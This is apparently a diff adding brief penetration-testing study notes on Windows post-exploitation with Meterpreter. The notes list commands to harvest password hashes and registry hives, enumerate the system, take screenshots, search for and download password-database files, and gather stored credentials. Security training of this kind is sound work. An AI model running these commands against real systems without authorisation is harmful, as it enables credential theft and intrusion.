@@ -1,0 +1,43 @@
+INE-Privilege Escalation Notes
+----------------------------------------------
+
+[+] File Harvesting
+	=> To main scripts that we can use for windows machines.
+
+		(+) Scraper:
+			harvest system info network shares, registry hives and password hashes
+
+			meterpreter> run scraper
+
+		(+) Winenum:
+			retrive all kinds of info about system including environments variables,network interface routing, user accounts.
+
+			meterpreter> run winenum
+
+	=> For taking screenshot
+
+		meterpreter> screenshot
+
+	=> For searching and downloading files on meterpreter
+
+		>> Searching
+			meterpreter> search -h 				// for help menu
+			
+			example: 
+				meterpreter> search -d C:\\users\\els\\ -f *.kdbk
+
+				note: -d :: path where to begin search
+					-f :: file pattern to search
+
+
+		>> Download 
+			meterpreter> download -h			// for help menu
+
+	=> Metasploit scripts for retriving stored credentials
+		path :: 'post/windows/gather/credentials/'
+
+	=> To know what software installed on target machine
+
+		meterpreter> run post/windows/gather/enum_application
+
+		
